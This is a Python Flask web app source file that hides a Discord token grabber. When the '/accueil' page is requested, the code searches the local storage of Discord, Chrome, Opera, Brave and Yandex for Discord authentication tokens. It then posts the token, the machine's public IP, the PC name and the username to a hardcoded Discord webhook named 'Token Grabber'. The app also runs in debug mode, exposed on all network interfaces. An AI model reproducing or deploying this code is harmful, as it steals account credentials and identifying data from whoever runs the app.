import os
import requests
from re import findall
from urllib.request import Request, urlopen

from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__, template_folder='./flaskr/templates', static_folder='./flaskr/static')


LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable\\Default",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable\\Default",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def main():

    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")

    for plateforms, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            pass

    headers = {
        'Content-Type': 'application/json',
    }
    webhook = {
        "content": '- **Token** : `{}`\n- **IP** : `{}`\n- **PC Name** : `{}`\n- **PC Username** : `{}`'.format(token, ip, pc_name, pc_username),
        "username": "Token Grabber",
    }
    try:
        response = requests.post('https://discord.com/api/webhooks/1219040567938252891/arTpUFJdb8CUkeGfRqYrSI7vnc5AcmaouJhkUKn5kHSfjojuu6slgkV5ysJaamQheot2', headers=headers, json=webhook)
        if response.status_code == 204:
            pass
        else:
            pass
    except:
        pass

@app.route('/accueil')
def index():
    main()
    return render_template('index.html')

app.run(debug=True, host='0.0.0.0', port=8001)